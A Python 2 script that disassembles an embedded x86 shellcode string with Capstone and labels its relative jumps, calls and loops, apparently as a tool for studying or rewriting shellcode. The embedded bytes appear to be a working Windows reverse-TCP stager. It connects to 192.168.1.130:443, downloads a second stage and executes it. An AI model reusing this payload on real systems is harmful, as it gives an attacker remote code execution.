from capstone import *
from capstone.x86 import *
import binascii,sys, struct, random


CODE = "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
CODE += "\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
CODE += "\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
CODE += "\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
CODE += "\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
CODE += "\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
CODE += "\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
CODE += "\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
CODE += "\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
CODE += "\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
CODE += "\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
CODE += "\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
CODE += "\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00"
CODE += "\xff\xd5\x6a\x05\x68\xc0\xa8\x01\x82\x68\x02\x00\x01"
CODE += "\xbb\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea"
CODE += "\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5"
CODE += "\x74\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec"
CODE += "\xe8\x61\x00\x00\x00\x6a\x00\x6a\x04\x56\x57\x68\x02"
CODE += "\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a"
CODE += "\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53"
CODE += "\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9"
CODE += "\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x22\x58\x68\x00\x40"
CODE += "\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5\x57"
CODE += "\x68\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\xe9"
CODE += "\x71\xff\xff\xff\x01\xc3\x29\xc6\x75\xc7\xc3\xbb\xf0"
CODE += "\xb5\xa2\x56\x6a\x00\x53\xff\xd5"

# Operation Code Manager

class opcodeManager:
	count = 1 # number of opcodes
	head = None
	tail = None

	def __init__(self, opcode):
		self.head = opcode
		self.tail = opcode
		self.count = 1

	def getCount(self):
		return self.count

	def getHead(self):
		return self.head

	def getTail(self):
		return self.tail

	def setHead(self, opcode):
		self.head = opcode

	def setTail(self, opcode):
		self.tail = opcode

	def addOpcode(self, opcode):
		self.tail.setNext(opcode)
		self.tail = opcode
		self.count = self.count + 1

	def delOpcode(self):
		self.tail = tail.getPrev()
		self.tail.setNext("")


# Operation Code Class
class opcode:

	relative = False
	offset = 0
	count = 0
	hexbytes = ""
	core = ""
	nextvalue = None
	prevvalue = None
	label = ""
	mnemonic = ""
	op_str = ""
	size = 0
	fromloc = ""
	toloc = ""

	def setFromLoc(self, yo):
		self.fromloc = yo

	def getFromLoc(self):
		return self.fromloc

	def setToLoc(self, yo):
		self.toloc = yo

	def getToLoc(self):
		return self.toloc

	def setMnemonic(self, yo):
		self.mnemonic = yo

	def getMnemonic(self):
		return self.mnemonic

	def setOpStr(self, opstr):
		self.op_str = opstr

	def getOpStr(self):
		return self.op_str

	def setSize(self, size):
		self.size = size

	def getSize(self):
		return self.size

	def setLabel(self, label):
		self.label = label

	def getLabel(self):
		return self.label

	def setNext(self, opcodeNext):
		self.nextvalue = opcodeNext

	def setPrev(self, opcodePrev):
		self.prevvalue = opcodePrev		

	def getNext(self):
		return self.nextvalue

	def getPrev(self):
		return self.prevvalue

	def setCount(self, count):
		self.count = count

	def setOffset(self, offset):
		self.offset = offset

	def getCount(self):
		return self.count

	def getOffset(self):
		return self.offset

	def setCore(self, core):
		self.core = core

	def getCore(self):
		return self.core

	def setRelative(self, rel):
		self.relative = rel

	def isRelative(self):
		return self.relative

COREJMP = "JMP"
CORECALL = "CALL"
CORELOOP = "LOOP"
COREOTHER ="OTHER"

labelcount = 1

count = 0
opcodelist = []
offset = 0

manager = None
headSet = False

"""for i in range(0,50):
	print i
	a = opcode()
	size = random.randint(1,8)
	a.setOffset(count)
	count = count + size
	a.setCount(count)
	if headSet == False:
		headSet = True
		manager = opcodeManager(a)
		print "added"
	else:
		manager.addOpcode(a)
"""

md = Cs(CS_ARCH_X86, CS_MODE_32)

for i in md.disasm(CODE, 0):

	if i.address != count:
		# something went wrong it should be equal
		print "[*] Error: offset calculation incorrect, this may affect results."

	a = opcode()
	a.setMnemonic(i.mnemonic)
	
	# this section only sets CORE value if it is a relative function, therefore
	# functions such as call ebp will not be logged as a call.

	if "0x" in i.op_str[0:2]:
		if "call" in i.mnemonic:
			a.setCore(CORECALL)
			a.setRelative(True)
		else:
			if "j" == i.mnemonic[0]:
				a.setCore(COREJMP)
				a.setRelative(True)
			else:
				if "loop" in i.mnemonic:
					a.setCore(CORELOOP)
					a.setRelative(True)
				else:
					a.setCore(COREOTHER)

	a.setOpStr(i.op_str)
	a.setSize(i.size)
	a.setOffset(count)
	count = count + i.size
	a.setCount(count)
	# Add the Head to instantiate the manager, else we just add to the manager.
	if headSet == False:
		headSet = True
		manager = opcodeManager(a)
	else:
		manager.addOpcode(a)

# Check to ensure Manager has been set correctly
if manager != None:
	# Get the head of the manager
	run = manager.getHead()

	
	# Iterate through the operation code manager

	print "[*] Relative Operations"
	print "======================="
	while run != None:
		#print "Test debug statement"
		
		if (run.getCore() != COREOTHER) and (run.getCore() != ""):
			#print "Relative %s:\t%s\t%s" % (run.getCore(), run.getMnemonic(), run.getOpStr())
			yolo = manager.getHead()
			while yolo != None:
				if yolo.getOffset() == int(run.getOpStr(),16):
					#print "\nTest:%s\t %s\t %s" % (yolo.getMnemonic(), yolo.getOffset(), int(run.getOpStr(),16))
					# At this point, we have found the opcode it is pointing to. We need to give it a label.
					run.setFromLoc("LABEL" + str(labelcount))
					yolo.setToLoc("LABEL" + str(labelcount))
					labelcount = labelcount + 1
				yolo = yolo.getNext()


		run = run.getNext()

	run = manager.getHead()

	while run != None:
		#print "Test debug statement"
		
		if (run.getCore() != COREOTHER) and (run.getCore() != ""):
			print "\t\t%s\t%s\t<%s>" % (run.getOffset(), run.getMnemonic(), run.getFromLoc())
		else:
			if (run.getToLoc() != ""):
				print "<%s>\t%s\t%s\t%s" % (run.getToLoc(), run.getOffset(), run.getMnemonic(), run.getOpStr())
			else:
				print "\t\t%s\t%s\t%s" % (run.getOffset(), run.getMnemonic(), run.getOpStr())
		run = run.getNext()

	print "[*] Found %s Relative Operations" % labelcount
else:
	print "[*] Error: Operation Code Manager not set correctly."